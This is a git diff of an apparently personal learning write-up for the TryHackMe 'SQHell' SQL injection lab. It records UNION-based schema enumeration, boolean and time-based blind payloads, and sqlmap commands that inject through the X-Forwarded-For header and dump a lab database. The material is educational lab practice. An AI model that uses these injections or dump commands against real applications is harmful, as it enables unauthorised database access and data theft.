@@ -6,13 +6,18 @@ Difficulty: Medium
 Description: Try and find all the flags in the SQL Injections
 Goals: OSCP Prep
 Learnt:
+- Alot of SQL 
 - I continuely glad I live in a time after SQLmap..
 - There is alot more to SQLi
+- Paramtres can be vulnerable to multiple 
+	- From the Flag2, id is vulnerable to multiple, but the workflow of doing CTFs is always exploratory
+- Thank you SQLmap exist. Once again. 
+- PHP logging IP with `X-Forwarded-For`
 Beyond Root:
 - Break down my understand a the details of how,where,why,which injecting(technique)
 - Break down the syntax and the why
 
-[Alh4zr3d](https://www.youtube.com/watch?v=MpJasg3IQNI)
+[Alh4zr3d](https://www.youtube.com/watch?v=MpJasg3IQNI) in this is invaluable as it is video where very helpful explains the logic while not malding and having Tiberious in the chat keeps the pace of this stream is awesome. To get some conclusion on the final flag for I read [Hariq Iqmal](https://infosecwriteups.com/tryhackme-sqhell-2dd7bd7f0990) for Flag 2, which either requires SQLmap or further scripting. My plan is to return to this room and go in blind as there is lot this room offers. I did so after an hour of poking around, some researching and thinking. Lesson being: PHP logging IP with `X-Forwarded-For`, means Headers are injectable if they are usage in the backend data handling.
 
 ## Login Flag
 
@@ -152,7 +157,7 @@ id=0+UNION+ALL+SELECT+'Alh4zr3d','Ippsec','Tib3rious'--+-
 ```
 
 No tiberious displayed.
-![](column1and2foruser.png)
+![1080](column1and2foruser.png)
 
 We are in sql hell 4
 ![1080](sqlhell4.png)
@@ -163,7 +168,7 @@ Normal we would enumerate the table names and columns says Al. So I will pause a
 /post?id=100+UNION+ALL+SELECT+group_concat(table_schema, '+:+',table_name),'kekw','GoingBeyond'+FROM+information_schema.tables+WHERE+table_schema+!%3d+'mysql'+AND+table_schema+!%3d+'information_schema'--+-
 ```
 
-![](onlyusersalmighthavetodothis.png)
+![1080](onlyusersalmighthavetodothis.png)
 
 There is no flag table!
 ![](noflagtablein4.png)
@@ -197,7 +202,7 @@ Al is upset
 
 Tiberious says this is a really difficult one Look up nested SQLi.
 
-*A useful function in SQL is creating a query within a query, also known as a subquery or nested query. A nested query is a SELECT statement that is typically enclosed in parentheses, and embedded within a primary SELECT , INSERT , or DELETE operation.* [DigitalOcean NEst SQL](https://www.digitalocean.com/community/tutorials/how-to-use-nested-queries)
+*A useful function in SQL is creating a query within a query, also known as a subquery or nested query. A nested query is a SELECT statement that is typically enclosed in parentheses, and embedded within a primary SELECT , INSERT , or DELETE operation.* [DigitalOcean Nest SQL](https://www.digitalocean.com/community/tutorials/how-to-use-nested-queries)
 
 Search-Engine-Dork: sql injections 
 
@@ -252,7 +257,8 @@ This being true means that the flag does not start with a F
 ![1080](captialF.png)
 
 THM{} is format
-![](flagsstartwithT.png)
+![1080](flagsstartwithT.png)
+`admin' AND (select substring(flag,1,1) FROM flag='T'-- -`
 
 He is scripting it. YES!
 ```python
@@ -294,4 +300,68 @@ A breadcrumb navigation provide links back to each previous page the user naviga
 
 I test all the links and nothing addition is added returning to /home, /login /register
 
-There seems to be nothing the database is returning to the page
+There seems to be nothing the database is returning to the page.
+
+After some time of thinking I think I need to concede. I have lot to learn and do. [Hafiq Iqmal](https://infosecwriteups.com/tryhackme-sqhell-2dd7bd7f0990) has a great writeup on SQHell. The reason it was not returning to the page is that it is a Time-based Blind injection am I glad I conceded.
+Hafiq says:
+in ... PHP, the `X-Fowarded-For` header is commonly used for logging the user IP Address.
+
+Again praising being alive and kicking about ethical hacking prior to SQLmap, manual time-based blind SQLi would probably ruin PenTests and people lives.
+```bash
+sqlmap -u "http://10.10.X.X/user?id=1" --headers="X-forwarded-for:1*" --risk=3 --level=5 --dbms=mysql --threads 10 --dbs --time-sec=1
+```
+
+From the previous usage Hafiq gets to the database then in the following targets the sqlhell_1 database
+```bash
+sqlmap -u "http://10.10.X.X/user?id=1" --headers="X-forwarded-for:1*" --risk=3 --level=5 --dbms=mysql --threads 10 -D sqhell_1 --tables --dump-all --time-sec=1
+```
+
+
+## Beyond Root - Summarisation of 5?s
+
+- Break down the syntax and the why and my understand a the details of how,where,why,which injecting(technique)
+1. Classic login bypass - no really valuble for me to explain
+2. `1' AND (SELECT * FROM (SELECT(SLEEP(1)))ocrz)-- nqrV` 
+	1. `X-Forward-For: 1'` break query in the Header
+	2. It is logging IP addresses so IP AND (QUERY) - IP=true and do this to=true
+	3. This targeting SQHell_1 db, select all from here
+	4. Then scripted SELECTing of each character if character SELECT != true do not sleep else SLEEP 1
+3. Error based so the sqli occur as we breaka then fix the query 
+```sql
+-- contatenate info from these fields
+-- Table schema is the map of the tables
+--  table 
+group_concat(table_schema, '+:+',table_name)
+-- From the `tables` of the `schema` 
+FROM+information_schema.tables
+-- At this point of the query we have all the tables, but we do not want 
+-- mysql the defulat table_name and the information schema
+-- leaving just the custom tables names
++WHERE+table_schema+!%3d+'mysql'+AND+table_schema+!%3d+'information_schema'--+-
+-- So for each line of the remain tables print:
+-- $table_schema : $table_name
+-- sqhell_5  : flag
+-- sqhell_5  : posts
+-- sqhell_5  : users
+```
+
+4. `0+UNION+ALL+SELECT+'1+UNION+ALL+SELECT+1,version(),3,4--+-','test2','test3'--+-`
+	1. ID parametre  is injectable- not all injectv happen initally
+		1. GET everything and in doing so break the query
+			1. From all that is seleted for the columns ,1,2,3,4 print the result of a function or a string
+	2. `admin' AND (select substring(flag,1,1) FROM flag='T'-- -`
+	3. We get a response in json that is either true or false suing this we blindly figure out where each letter in a correct
+	4. `substring(i, ii, iii)` 
+		1. string
+		2. This is the position in the string that we incrementally test till completion in the script
+		3. This never changes as it is the length of the character
+
+QBM 
+
+- SQLI?
+	- Can you create an Error and fix it?
+	- Is the data returned a Boolean directly or indrectly?
+	- Are Headers used in the back to store SQL data?
+		- PHP: `X-Forward-For: 10.10.10.0.` to log IP addresses
+	- If nothing is returned can you query the database to sleep()?
+       - If there are multiple fields is there second order injection with `'\''` and `'"'` to generate a error, have do so for each?
